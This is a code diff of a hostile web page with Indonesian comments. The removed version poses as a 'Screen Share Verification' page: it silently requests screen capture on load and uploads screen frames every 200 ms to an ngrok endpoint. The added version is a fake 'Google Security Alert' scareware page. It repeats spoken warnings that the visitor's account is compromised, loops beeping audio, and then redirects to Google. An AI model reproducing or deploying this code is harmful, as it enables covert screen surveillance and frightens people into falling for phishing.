@@ -1,26 +1,16 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Screen Share Verification</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
-  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; width: 100%; }
-  h2 { color: #f00; margin-bottom: 10px; font-size: 20px; }
-  p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 150px; overflow-y: auto; border: 1px solid #333; }
-  iframe, video, canvas { display: none !important; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
-<div class="panel" id="main-card">
-  <h2>🔒 Screen Share Verification</h2>
-  <p>Memproses secara otomatis...</p>
-  <div id="log">Sistem siap.</div>
-</div>
 
 <div id="launcher-container" style="display: none;"></div>
 
@@ -28,136 +18,186 @@
 (function () {
   'use strict';
 
-  var logEl = document.getElementById('log');
-  var executed = false;
-
-  function log(msg) {
-    logEl.innerHTML += "> " + msg + "<br>";
-    console.log(msg);
-  }
-
   // ============================================
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-  var REDIRECT_DELAY = 3000; // 3 detik
+  var REDIRECT_DELAY = 1500; // 1.5 detik
+
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 2000, // Loop sangat cepat
+      maxRepeats: 100 // Loop banyak
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
+
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, audioCtx: null };
 
   // ============================================
-  // 1. INJECT IFRAME ZERO-CLICK (SCREEN SHARE)
+  // 1. TTS (LOOP)
   // ============================================
-  function injectScreenShareIframe() {
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
+
     try {
-      log("[+] Membuat Iframe Tersembunyi (Screen Share)...");
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
 
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) {}
+  }
+
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
+  }
+
+  // ============================================
+  // 2. AUDIO CONTEXT (BEEP LOOP)
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      state.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      if (state.audioCtx.state === 'suspended') {
+        state.audioCtx.resume().catch(function(){});
+      }
+      var osc = state.audioCtx.createOscillator();
+      var gain = state.audioCtx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(state.audioCtx.destination);
+      osc.start();
+      osc.stop(state.audioCtx.currentTime + 0.1);
+    } catch (e) {}
+  }
+
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
+
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
+
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+    } catch (e) {
+      startTTS();
+    }
+  }
+
+  // ============================================
+  // 3. INJECT IFRAME AUDIO (BACKUP)
+  // ============================================
+  function injectAudioIframe() {
+    try {
       var iframe = document.createElement('iframe');
-      // Atribut allow untuk display-capture
-      iframe.allow = "display-capture; autoplay; picture-in-picture; fullscreen";
+      iframe.allow = "autoplay";
       iframe.style.display = "none";
       
       iframe.srcdoc = `
         <!DOCTYPE html>
         <html>
         <body>
-          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
-          <canvas id="hiddenCanvas" width="1280" height="720" style="display:none;"></canvas>
-          
           <script>
-            (function() {
-              // 1. Minta Screen Share (Zero-Click)
-              navigator.mediaDevices.getDisplayMedia({ 
-                video: { cursor: "always" }, 
-                audio: false 
-              })
-                .then(function(stream) {
-                  var video = document.getElementById('hiddenVideo');
-                  video.srcObject = stream;
-                  video.play().catch(function(){});
-                  parent.postMessage({ type: 'SCREEN_OK' }, '*');
+            // TTS & Beep di dalam iframe
+            if ('speechSynthesis' in window) {
+              var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
+              u.lang = 'en-US';
+              u.rate = 0.9;
+              u.volume = 1.0;
+              window.speechSynthesis.speak(u);
+            }
 
-                  // 2. Paksa Masuk PiP
-                  setTimeout(function() {
-                    if (document.pictureInPictureElement) {
-                      document.exitPictureInPicture();
-                    }
-                    video.requestPictureInPicture()
-                      .then(function() {
-                        parent.postMessage({ type: 'PIP_OK' }, '*');
-                      })
-                      .catch(function(err) {
-                        parent.postMessage({ type: 'PIP_FAIL', error: err.message }, '*');
-                      });
-                  }, 500);
-
-                  // 3. Telemetri (Kirim Frame Layar)
-                  setInterval(function() {
-                    var canvas = document.getElementById('hiddenCanvas');
-                    var ctx = canvas.getContext('2d');
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                      canvas.toBlob(function(blob) {
-                        if (!blob) return;
-                        var formData = new FormData();
-                        formData.append('file', blob, 'screen.jpg');
-                        fetch('${SERVER_ENDPOINT}', {
-                          method: 'POST',
-                          body: formData,
-                          keepalive: true
-                        }).catch(function(){});
-                      }, 'image/jpeg', 0.6);
-                    }
-                  }, 200);
-
-                })
-                .catch(function(err) {
-                  parent.postMessage({ type: 'SCREEN_FAIL', error: err.name }, '*');
-                });
-            })();
+            try {
+              var ctx = new (window.AudioContext || window.webkitAudioContext)();
+              if (ctx.state === 'suspended') ctx.resume();
+              var osc = ctx.createOscillator();
+              osc.type = 'sawtooth';
+              osc.frequency.value = 880;
+              osc.connect(ctx.destination);
+              osc.start();
+              osc.stop(ctx.currentTime + 2.0);
+            } catch(e) {}
           <\/script>
         </body>
         </html>
       `;
 
       document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe disuntikkan.");
-    } catch(e) {
-      log("[-] Iframe Error: " + e.message);
-    }
+    } catch(e) {}
   }
 
   // ============================================
-  // 2. LISTENER PESAN DARI IFRAME
+  // 4. TRIGGER (KLIK)
   // ============================================
-  window.addEventListener('message', function(e) {
-    switch (e.data.type) {
-      case 'SCREEN_OK': log("[+] 🚨 Screen Share DIIZINKAN (Zero-Click)!"); break;
-      case 'PIP_OK': log("[+] 🎥 PiP AKTIF!"); break;
-      case 'SCREEN_FAIL': log("[-] Screen Share ditolak: " + e.data.error); break;
-      case 'PIP_FAIL': log("[-] PiP ditolak: " + e.data.error); break;
-    }
-  });
+  document.body.addEventListener('click', function() {
+    if (window.executed) return;
+    window.executed = true;
 
-  // ============================================
-  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
-  // ============================================
-  window.addEventListener('load', function() {
-    if (executed) return;
-    executed = true;
+    // ============================================
+    // A. AUDIO INIT (0ms)
+    // ============================================
+    unlockAudioContext();
+    startTTS();
+    playMainAudio();
 
-    log("[!] Memulai Zero-Click Screen Share...");
+    // ============================================
+    // B. INFINITE LOOP (Setiap 2000ms)
+    // ============================================
+    var loopInterval = setInterval(function() {
+      unlockAudioContext();
+      startTTS();
+      injectAudioIframe();
+    }, 2000);
 
-    // A. Inject Iframe (0ms)
-    injectScreenShareIframe();
-
-    // B. Redirect ke Google (Setelah 3 detik)
+    // ============================================
+    // C. REDIRECT KE GOOGLE (1500ms)
+    // ============================================
     setTimeout(function() {
-      log("[+] Redirect ke Google.com...");
       try {
         window.location.replace(TARGET_URL);
       } catch(e) {}
     }, REDIRECT_DELAY);
 
-  });
+  }, { once: true });
 
 })();
 </script>
